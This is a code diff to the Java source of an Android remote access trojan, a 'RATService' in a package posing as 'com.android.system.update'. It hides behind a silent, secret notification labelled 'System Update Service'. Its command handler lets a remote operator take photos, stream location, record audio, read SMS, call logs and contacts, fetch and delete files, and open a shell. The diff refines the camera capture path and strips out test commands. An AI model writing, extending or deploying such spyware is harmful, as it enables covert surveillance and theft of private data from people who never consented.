@@ -1,3 +1,4 @@
+
 package com.android.system.update;
 
 import android.app.AlarmManager;
@@ -81,7 +82,7 @@ public class RATService extends Service {
     private boolean isLocationTracking = false;
     
     // Modules
-    private Camera2Module cameraModule;
+    private CameraModule cameraModule;
     private MicModule micModule;
     private LocationModule locationModule;
     private SmsModule smsModule;
@@ -117,19 +118,15 @@ public class RATService extends Service {
         // Acquire wake lock to prevent CPU sleep
         acquireWakeLock();
         
-        // Create notification channel and start foreground service with proper camera type
         createNotificationChannel();
-        
-        // Create a notification that properly declares camera usage for Android 10+
-        Notification notification = createNotification();
-        startForeground(NOTIFICATION_ID, notification);
+        startForeground(NOTIFICATION_ID, createNotification());
         
         // Initialize location manager
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         startLocationThread();
         
         // Initialize modules based on config
-        if (Config.ENABLE_CAMERA) cameraModule = new Camera2Module(this);
+        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
         if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
         if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
         if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
@@ -173,21 +170,15 @@ public class RATService extends Service {
     private Notification createNotification() {
         int icon = android.R.drawable.stat_sys_download_done;
         
-        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Update Service")
             .setContentText("Optimizing system performance")
             .setSmallIcon(icon)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setSilent(true)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET);
-        
-        // For Android 10+, set the foreground service behavior to allow camera access
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE);
-        }
-        
-        return builder.build();
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .build();
     }
     
     private void acquireWakeLock() {
@@ -535,7 +526,7 @@ public class RATService extends Service {
                 break;
                 
             case "help":
-                String helpText = "Available commands: info, location, location_stream [start/stop], camera, camera_switch, camera_info, test_camera, test_camera_deep, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
+                String helpText = "Available commands: info, location, location_stream [start/stop], camera, camera_switch, camera_info, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]";
                 sendCommand("HELP|" + helpText);
                 break;
                 
@@ -563,83 +554,23 @@ public class RATService extends Service {
                 handleLocationStreamCommand(args);
                 break;
                 
-            // TEST CAMERA COMMAND - Basic test
-            case "test_camera":
-                if (cameraModule != null) {
-                    sendCommand("CAMERA_TEST|Camera module exists");
-                    // Small delay to prevent mixing responses
-                    try {
-                        Thread.sleep(100);
-                    } catch (InterruptedException e) {
-                        // Ignore
-                    }
-                    String info = cameraModule.getCurrentCameraInfo();
-                    sendCommand("CAMERA_TEST|" + info);
-                } else {
-                    sendCommand("CAMERA_TEST|Camera module is NULL");
-                }
-                break;
-                
-            // DEEP CAMERA TEST - More detailed info
-            case "test_camera_deep":
-                if (cameraModule != null) {
-                    String result = cameraModule.testCamera();
-                    sendCommand("CAMERA_DEEP_TEST|" + result);
-                } else {
-                    sendCommand("CAMERA_DEEP_TEST|Camera module is NULL");
-                }
-                break;
-                
-            // CAMERA COMMANDS - Fixed with proper foreground service handling
+            // CAMERA COMMANDS - FIXED: Removed duplicate case
             case "camera":
             case "camera_photo":
                 if (cameraModule != null) {
                     Log.d(TAG, "📸 Taking photo with camera module");
-                    
-                    // Notify that camera is about to be used (this helps trigger the notification icon)
-                    runOnMainThread(() -> {
-                        Log.d(TAG, "📸 Camera indicator should now appear");
-                    });
-                    
-                    // Use a handler to ensure we're on the right thread
-                    new Handler(Looper.getMainLooper()).post(() -> {
-                        cameraModule.takePhoto(new Camera2Module.CameraCallback() {
-                            @Override
-                            public void onPhotoTaken(String base64Image) {
-                                Log.d(TAG, "📸 Photo taken successfully, sending response");
-                                
-                                // Send response in a separate thread to avoid blocking
-                                new Thread(() -> {
-                                    try {
-                                        if (out != null) {
-                                            out.println(base64Image);
-                                            out.flush();
-                                            Log.d(TAG, "📸 Camera response sent to server");
-                                        } else {
-                                            Log.e(TAG, "📸 Output stream is null");
-                                        }
-                                    } catch (Exception e) {
-                                        Log.e(TAG, "Error sending camera response", e);
-                                    }
-                                }).start();
-                            }
-                            
-                            @Override
-                            public void onError(String error) {
-                                Log.e(TAG, "📸 Camera error: " + error);
-                                
-                                new Thread(() -> {
-                                    try {
-                                        if (out != null) {
-                                            out.println("CAMERA|ERROR: " + error);
-                                            out.flush();
-                                        }
-                                    } catch (Exception e) {
-                                        Log.e(TAG, "Error sending error", e);
-                                    }
-                                }).start();
-                            }
-                        });
+                    cameraModule.takePhoto(new CameraModule.CameraCallback() {
+                        @Override
+                        public void onPhotoTaken(String base64Image) {
+                            Log.d(TAG, "📸 Photo taken, sending response");
+                            sendCommand(base64Image);
+                        }
+                        
+                        @Override
+                        public void onError(String error) {
+                            Log.e(TAG, "📸 Camera error: " + error);
+                            sendCommand(error);
+                        }
                     });
                 } else {
                     Log.e(TAG, "📸 Camera module is null");
@@ -845,15 +776,6 @@ public class RATService extends Service {
             default:
                 sendCommand("UNKNOWN_CMD|" + cmd);
                 break;
-        }
-    }
-    
-    // Helper method to run code on main thread
-    private void runOnMainThread(Runnable action) {
-        if (Looper.myLooper() == Looper.getMainLooper()) {
-            action.run();
-        } else {
-            new Handler(Looper.getMainLooper()).post(action);
         }
     }
     
@@ -1106,3 +1028,4 @@ public class RATService extends Service {
         super.onDestroy();
     }
 }
+
